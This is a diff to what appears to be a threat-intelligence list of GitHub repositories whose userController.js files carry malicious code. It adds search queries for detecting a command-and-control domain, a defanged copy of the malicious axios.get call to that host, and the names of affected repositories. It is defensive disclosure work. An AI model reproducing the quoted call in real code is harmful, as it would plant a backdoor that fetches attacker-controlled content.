@@ -415,5 +415,16 @@ ali-718/goldencity_test/backend/controllers/userController.js
 truongxavier/react2/backend/controllers/userController.js
 Rafiqul-Ala-Mahid/omnistate/src/backend/controllers/userController.js
 
+# Github Query: https://github.com/search?q=content%3A%22const+data+%3D+await+axios.get%28%27https%3A%2F%2Fapikey-six.vercel.app%22&type=codehttps://github.com/search?q=content%3A%22eC1zZWNy%22&type=code
+# This query detects a c2 domain
 
+# Original malicious cpde ,Defanged URL
+
+const data = await axios.get('hxxps://apikey-six[.]vercel[.]app/apikey/MNOPQRS678T90HML');
+	
+# Malicious repositories
+shivanshxyz/demo_version · server/controllers/userController.js
+MarkFeder/bestcity_demo · server/controllers/userController.js
+accuratepipiroma/goldencity · server/controllers/userController.js
+macwlu97/bestcity-demo · server/controllers/userController.js
 
